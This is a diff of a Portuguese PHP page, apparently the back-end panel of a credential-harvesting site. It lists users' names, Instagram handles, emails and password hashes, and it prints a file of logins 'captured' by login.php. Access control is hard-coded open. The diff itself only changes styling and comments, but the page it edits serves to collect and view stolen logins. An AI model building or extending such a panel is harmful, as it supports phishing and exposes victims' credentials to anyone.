@@ -2,15 +2,15 @@
 require 'db.php';
 session_start();
 
-// Verificação simples para acesso (pode trocar por verificação por sessão depois)
-$acesso_liberado = true; // Coloque false para bloquear
+// ⚠️ Simples verificação de acesso
+$acesso_liberado = true;
 
 if (!$acesso_liberado) {
     echo "Acesso negado.";
     exit();
 }
 
-// Pega os usuários do banco de dados
+// Buscar usuários no banco
 $stmt = $pdo->query("SELECT nome, instagram, email, senha_hash, data_registro FROM usuarios");
 $usuarios = $stmt->fetchAll(PDO::FETCH_ASSOC);
 ?>
@@ -19,13 +19,46 @@ $usuarios = $stmt->fetchAll(PDO::FETCH_ASSOC);
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <title>Usuários Cadastrados</title>
+    <title>Lista de Usuários</title>
     <link rel="stylesheet" href="style.css">
+    <style>
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            color: white;
+        }
+        th, td {
+            padding: 10px;
+            border: 1px solid #aaa;
+        }
+        th {
+            background: #900;
+        }
+        .login-container {
+            max-width: 1000px;
+            margin: auto;
+            background: linear-gradient(to right, #cc0000, #ff6600);
+            padding: 30px;
+            border-radius: 12px;
+            color: white;
+        }
+        .btn-voltar {
+            background: white;
+            color: #cc0000;
+            padding: 10px 20px;
+            text-decoration: none;
+            font-weight: bold;
+            border-radius: 6px;
+        }
+        .btn-voltar:hover {
+            background: #ffcccc;
+        }
+    </style>
 </head>
 <body>
     <div class="login-container">
         <h1>👀 Lista de Usuários Cadastrados</h1>
-        <table border="1" cellpadding="8" cellspacing="0" style="width:100%; color:white;">
+        <table>
             <tr>
                 <th>Nome</th>
                 <th>Instagram</th>
@@ -44,13 +77,13 @@ $usuarios = $stmt->fetchAll(PDO::FETCH_ASSOC);
             <?php endforeach; ?>
         </table>
 
-        <hr><br>
-        <h2 style="color:#fff;">📂 Logins Capturados no login.php</h2>
-        <pre style="background: #111; color: #0f0; padding: 10px; border-radius: 10px;">
+        <br><br>
+        <h2>📂 Logins Capturados no login.php</h2>
+        <pre style="background:#111;color:#fff;padding:10px;border-radius:8px;">
 <?php
-$logins = 'logins.txt';
-if (file_exists($logins)) {
-    echo htmlspecialchars(file_get_contents($logins));
+$arquivo = 'logins.txt';
+if (file_exists($arquivo)) {
+    echo htmlspecialchars(file_get_contents($arquivo));
 } else {
     echo "Arquivo logins.txt não encontrado.";
 }
